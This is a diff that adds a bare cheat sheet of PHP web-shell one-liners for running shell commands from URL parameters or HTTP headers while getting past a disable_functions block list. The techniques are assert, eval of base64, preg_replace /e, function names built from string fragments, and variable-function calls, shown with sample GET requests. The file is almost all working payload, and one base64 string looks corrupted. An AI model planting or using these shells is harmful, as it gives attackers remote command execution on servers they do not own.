@@ -1,0 +1,39 @@
+disable_functions = exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source
+
+assert($_GET[1]);  # anstelle von system bzw exec.
+
+GET /x.php?1=ls HTTP/1.1
+system($_GET[1]);
+
+eval(base64_decode("c3lz4rV23CRfsd0VUW4dKTs="));
+
+preg_replace("/.*/e","sy" . "stem('$_GET[1]')","");
+
+$a ="sy";
+$b = "ste";
+$c = "m";
+$f = $a.$b.$c;
+$f($_GET[1]); 
+
+$f = str_replace('z', 's', 'zyztem');
+$f($_GET[1]);
+
+
+($a=@$_SERVER['HTTP_1']).@$a($_SERVER['HTTP_2']);
+($a=@$_GET[1]).@$a($_GET[2])
+GET /x.php?1=system&2=ls HTTP/1.1
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
